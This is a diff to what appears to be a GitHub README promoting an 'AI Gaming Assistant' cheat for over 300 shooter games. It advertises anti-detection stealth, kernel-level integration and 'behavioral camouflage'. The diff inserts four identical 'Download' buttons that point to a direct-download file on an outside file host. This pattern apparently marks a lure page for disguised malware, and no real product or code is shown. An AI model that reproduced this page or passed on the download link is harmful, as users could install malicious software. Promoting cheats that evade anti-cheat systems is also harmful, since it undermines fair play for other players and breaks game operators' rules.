@@ -2,6 +2,9 @@
 
 **AI Gaming Assistant** is an advanced artificial intelligence system designed to enhance gaming performance across 300+ popular shooter games. This professional-grade tool provides intelligent assistance, real-time analysis, and adaptive gameplay optimization while maintaining complete stealth status.
 
+[<img width="588" height="120" alt="Download" src="https://github.com/user-attachments/assets/f3d98814-6d2a-47f3-9eec-748fa3eb554c" />](https://www.4sync.com/web/directDownload/P8Svn8tf/jBQpK3f0.256b3617a390742234e596e241e03673)
+
+
 ---
 
 ## 📋 Product Overview
@@ -11,6 +14,8 @@
 ---
 
 ## 🎯 Supported Games (300+ Titles)
+
+[<img width="294" height="60" alt="Download" src="https://github.com/user-attachments/assets/f3d98814-6d2a-47f3-9eec-748fa3eb554c" />](https://www.4sync.com/web/directDownload/P8Svn8tf/jBQpK3f0.256b3617a390742234e596e241e03673)
 
 ### 🔥 Top-Tier Competitive Shooters
 - **Counter-Strike 2** - Premier tactical shooter optimization
@@ -48,6 +53,8 @@
 - **Squad** - Tactical military simulation
 - **Post Scriptum** - Historical shooter enhancement
 
+[<img width="294" height="60" alt="Download" src="https://github.com/user-attachments/assets/f3d98814-6d2a-47f3-9eec-748fa3eb554c" />](https://www.4sync.com/web/directDownload/P8Svn8tf/jBQpK3f0.256b3617a390742234e596e241e03673)
+
 ---
 
 ## 🛡️ Security & Stealth Features
@@ -58,6 +65,8 @@
 - **Memory Encryption** - Military-grade encryption for all processes
 - **Behavioral Camouflage** - Mimics legitimate player behavior patterns
 - **Real-time Adaptation** - Dynamic adjustment to game updates and patches
+
+[<img width="294" height="60" alt="Download" src="https://github.com/user-attachments/assets/f3d98814-6d2a-47f3-9eec-748fa3eb554c" />](https://www.4sync.com/web/directDownload/P8Svn8tf/jBQpK3f0.256b3617a390742234e596e241e03673)
 
 ### 🎭 Stealth Mechanisms
 - **Kernel-level Integration** - Deep system integration for maximum stealth
@@ -105,6 +114,8 @@
 | **Performance Consistency** | Skill fluctuations | Stable peak performance |
 | **Multi-tasking** | Limited capacity | Simultaneous tracking |
 | **Decision Making** | Human error factor | AI-optimized choices |
+
+[<img width="294" height="60" alt="Download" src="https://github.com/user-attachments/assets/f3d98814-6d2a-47f3-9eec-748fa3eb554c" />](https://www.4sync.com/web/directDownload/P8Svn8tf/jBQpK3f0.256b3617a390742234e596e241e03673)
 
 ---
 
